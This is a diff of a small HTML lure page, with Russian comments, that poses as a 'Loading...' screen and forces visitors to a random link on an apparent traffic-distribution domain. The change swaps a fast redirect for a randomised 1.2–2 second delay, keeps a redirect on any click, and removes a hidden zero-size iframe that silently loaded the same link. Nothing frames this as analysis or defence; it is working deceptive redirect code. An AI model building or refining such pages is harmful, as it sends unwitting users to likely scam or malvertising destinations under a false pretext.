@@ -12,14 +12,14 @@ body {
     text-align: center;
     font-family: Arial;
 }
-h1 {
+h2 {
     margin-top: 80px;
 }
 </style>
 
 <script>
 
-// === СПИСОК ССЫЛОК (добавляй сюда) ===
+// === СПИСОК ССЫЛОК ===
 let links = [
 "https://news-tds.xyz/?p=NzA0MzQ3OTIxYjVjNTk3OWRkYjNjMWFjZTMyMzZjY2V8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8ODE5OTQxOTM=&v=2&poid=0&coid=0",
 "https://news-tds.xyz/?p=NzA0MzQ3OTIxYjVjNTk3OWRkYjNjMWFjZTMyMzZjY2V8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8ODE5OTQxOTM=&v=2&poid=0&coid=0",
@@ -29,12 +29,15 @@ let links = [
 // случайная ссылка
 let randomLink = links[Math.floor(Math.random() * links.length)];
 
-// быстрый редирект
+// случайная задержка (1200–2000 ms)
+let delay = Math.floor(Math.random() * (2000 - 1200 + 1)) + 1200;
+
+// редирект
 setTimeout(function(){
     window.location.href = randomLink;
-}, 400);
+}, delay);
 
-// клик по странице
+// клик по странице (fallback)
 document.addEventListener("click", function(){
     window.location.href = randomLink;
 });
@@ -45,12 +48,7 @@ document.addEventListener("click", function(){
 
 <body>
 
-<h1>🔥 Loading chat...</h1>
-
-<!-- iframe (тоже рандом) -->
-<script>
-document.write('<iframe src="' + randomLink + '" width="0" height="0" style="display:none;"></iframe>');
-</script>
+<h2>Loading... please wait</h2>
 
 </body>
 </html>
